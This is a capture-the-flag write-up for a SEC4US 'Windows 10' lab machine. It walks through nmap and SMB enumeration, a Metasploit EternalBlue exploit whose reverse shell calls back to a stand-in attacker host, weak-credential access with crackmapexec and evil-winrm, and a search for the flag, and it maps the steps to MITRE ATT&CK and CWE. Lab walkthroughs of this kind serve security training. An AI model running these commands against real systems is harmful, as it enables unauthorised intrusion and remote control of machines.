# Maq174: Windows 10

Writeup for the **Windows 10** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** Hacking: Easy
> **Difficulty:** Easy
> **Points:** 174

---

## Overview

A Windows 10 machine with exploitable services or weak configurations. Modern Windows targets require careful enumeration, as default hardening is stronger than legacy systems.

## Reconnaissance

```bash
nmap -sV -sC -p- [TARGET_IP] -oN nmap_scan.txt
```

Common ports: SMB (445), RDP (3389), WinRM (5985), HTTP. Enumerate SMB:

```bash
crackmapexec smb [TARGET_IP]
smbclient -L //[TARGET_IP] -N
```

Check for EternalBlue vulnerability:

```bash
nmap -p 445 --script smb-vuln-ms17-010 [TARGET_IP]
```

## Exploitation

**If MS17-010 is present:**

```bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS [TARGET_IP]
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST [ATTACKER_IP]
run
```

**If credentials are weak, try psexec or WinRM:**

```bash
crackmapexec smb [TARGET_IP] -u [USER] -p [PASS] --exec-method smbexec
evil-winrm -i [TARGET_IP] -u [USER] -p [PASS]
```

**Check for web application vulnerabilities if HTTP is exposed:**

```bash
gobuster dir -u http://[TARGET_IP] -w /usr/share/wordlists/dirb/common.txt
```

## Post-Exploitation

```
whoami /priv
dir C:\Users\*\Desktop\flag* /s
```

## Security Framework Mapping

### MITRE ATT&CK

| Technique | ID |
|-----------|----|
| Exploitation of Remote Services | T1210 |
| Valid Accounts: Local Accounts | T1078.003 |
| Remote Services: SMB/Windows Admin Shares | T1021.002 |

### CWE

- **CWE-787:** Out-of-bounds Write (EternalBlue)
- **CWE-521:** Weak Password Requirements

---

Windows 10 was built to be harder to crack, but no operating system is bulletproof when patches are missing and passwords are predictable.

```
(❍ᴥ❍ʋ)
```

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
